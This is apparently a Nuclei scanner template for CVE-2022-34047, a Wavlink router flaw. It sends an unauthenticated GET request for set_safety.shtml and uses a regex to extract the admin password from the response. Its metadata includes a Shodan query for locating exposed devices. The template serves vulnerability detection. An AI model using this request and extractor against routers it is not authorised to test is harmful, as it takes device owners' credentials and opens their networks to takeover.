id: CVE-2022-34047
info:
  author: For3stCo1d
  description: 'An access control issue in Wavlink WN530HG4 M30HG4.V5030.191116 allows
    attackers to obtain usernames and passwords via view-source:http://IP_ADDRESS/set_safety.shtml?r=52300
    and searching for [var syspasswd].

    '
  metadata:
    shodan-query: http.title:"Wi-Fi APP Login"
    verified: true
  name: Wavlink Set_safety.shtml - Password Exposure
  reference:
  - https://drive.google.com/file/d/1sTQdUc12aZvJRFeb5wp8AfPdUEkkU9Sy/view?usp=sharing
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34047
  severity: high
  tags: cve,cve2022,wavlink,router,exposure
requests:
- extractors:
  - regex:
    - syspasswd="(.+?)"
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - var syspasswd="
    - <title>APP</title>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /set_safety.shtml?r=52300 HTTP/1.1

    Host: {{Hostname}}

    '
